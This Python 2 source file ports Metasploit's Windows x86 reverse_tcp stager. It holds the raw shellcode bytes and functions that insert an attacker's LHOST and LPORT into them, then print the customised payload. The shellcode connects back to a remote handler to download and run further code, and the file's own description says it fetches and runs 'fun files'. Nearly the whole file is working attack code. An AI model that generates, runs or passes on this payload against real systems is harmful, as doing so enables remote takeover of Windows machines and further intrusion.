# This is the reverse_tcp payload, completely ported from the Metasploit
# Framework.
# https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stagers/windows/reverse_tcp.rb

import binascii
import re
import socket
import sys


class RevTCP:

    def __init__(self):
        self.name = "Reverse TCP Stager (Stage 1)"
        self.description = "Connects back to a handler to download and run\
            fun files :)"
        self.platform = "Windows"
        self.arch = "x86"
        self.lport = 4444
        self.lhost = None
        self.retries_offset = 192
        self.lhost_offset = 194
        self.lport_offset = 201
        self.exitfunc_offset = 226
        self.exit_func = '\xf0\xb5\xa2\x56'
        self.customized_shellcode = ''
        self.stager = (
            "\xFC\xE8\x86\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
            "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
            "\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
            "\x8B\x52\x10\x8B\x42\x3C\x8B\x4C\x10\x78\xE3\x4A\x01\xD1\x51\x8B" +
            "\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3C\x49\x8B\x34\x8B\x01\xD6\x31" +
            "\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4\x03\x7D\xF8" +
            "\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B" +
            "\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61" +
            "\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x89\x5D\x68\x33\x32" +
            "\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8" +
            "\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x50" +
            "\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x6A" +
            "\x05\x68\x7F\x00\x00\x01\x68\x02\x00\x11\x5C\x89\xE6\x6A\x10\x56" +
            "\x57\x68\x99\xA5\x74\x61\xFF\xD5\x85\xC0\x74\x0C\xFF\x4E\x08\x75" +
            "\xEC\x68\xF0\xB5\xA2\x56\xFF\xD5\x6A\x00\x6A\x04\x56\x57\x68\x02" +
            "\xD9\xC8\x5F\xFF\xD5\x8B\x36\x6A\x40\x68\x00\x10\x00\x00\x56\x6A" +
            "\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53\x57\x68" +
            "\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29\xC6\x85\xF6\x75\xEC\xC3")

    def set_attrs(self, lport_value, lhost_value):
        self.lport = lport_value

        # Check if given a domain or IP address:
        if self.validate_ip(lhost_value):
            self.lhost = lhost_value
        else:
            try:
                self.lhost = socket.gethostbyname(lhost_value)
            except socket.gaierror:
                print "[*] Error: Invalid domain or IP provided for LHOST value!"
                print "[*] Error: Please re-run with the correct value."
                sys.exit()

        return

    def gen_shellcode(self):
        # Take the passed in attributes and gen shellcode
        ip_shellcode = ''
        n = 2
        ip_shellcode_stage = binascii.hexlify(socket.inet_aton(self.lhost))
        ip_shellcode_stage = [ip_shellcode_stage[i:i+n] for i in range(0, len(ip_shellcode_stage), n)]
        for two_bytes in ip_shellcode_stage:
            ip_shellcode += '\\x' + two_bytes

        # convert port to shellcode
        port_shellcode_stage = str(hex(self.lport).lstrip('0'))
        if len(port_shellcode_stage.lstrip('x')) == 3:
            # detect if odd number, is so, need to add a '0' to the front
            port_1half = '0' + port_shellcode_stage[0:2].lstrip('x')
            port_1half = '\\x' + port_1half
            port_2half = port_shellcode_stage[2:4]
            port_2half = '\\x' + port_2half
            port_shellcode = port_1half + port_2half
        elif len(port_shellcode_stage.lstrip('x')) == 4:
            port_1half = port_shellcode_stage[1:3]
            port_1half = '\\x' + port_1half
            port_2half = port_shellcode_stage[3:5]
            port_2half = '\\x' + port_2half
            port_shellcode = port_1half + port_2half
        elif len(port_shellcode_stage.lstrip('x')) == 2:
            port_1half = port_shellcode_stage[1:3].lstrip('x')
            port_1half = '\\x' + port_1half
            port_2half = '00'
            port_2half = '\\x' + port_2half
            port_shellcode = port_2half + port_1half
        elif len(port_shellcode_stage.lstrip('x')) == 1:
            port_1half = port_shellcode_stage.lstrip('x')
            port_1half = '\\x0' + port_1half
            port_2half = '\\x00'
            port_shellcode = port_2half + port_1half

        retries = '\x09'

        stager_shellcode = self.stager[0:self.retries_offset]
        stager_shellcode += retries
        stager_shellcode += self.stager[self.retries_offset + 1:self.lhost_offset]
        stager_shellcode += ip_shellcode.decode('string-escape')
        stager_shellcode += self.stager[self.lhost_offset + 4:self.lport_offset]
        stager_shellcode += port_shellcode.decode('string-escape')
        stager_shellcode += self.stager[self.lport_offset + 2:]

        self.customized_shellcode = "\\x" + '\\x'.join(stager_shellcode.encode('hex')[i:i+2] for i in range(0, len(stager_shellcode.encode('hex')), 2))
        return

    def print_shellcode(self):
        print self.customized_shellcode
        return

    def payload_stats(self, cli_info):
        print "Payload Name: " + self.name
        print "IP Address: " + cli_info.ip
        print "Port: " + str(cli_info.port)
        print "Shellcode Size: " + str(len(self.customized_shellcode.decode('string-escape'))) + '\n'
        return

    def validate_ip(self, val_ip):
        # This came from (Mult-line link for pep8 compliance)
        # http://python-iptools.googlecode.com/svn-history/r4
        # /trunk/iptools/__init__.py
        ip_re = re.compile(r'^(\d{1,3}\.){0,3}\d{1,3}$')
        if ip_re.match(val_ip):
            quads = (int(q) for q in val_ip.split('.'))
            for q in quads:
                if q > 255:
                    return False
            return True
        return False
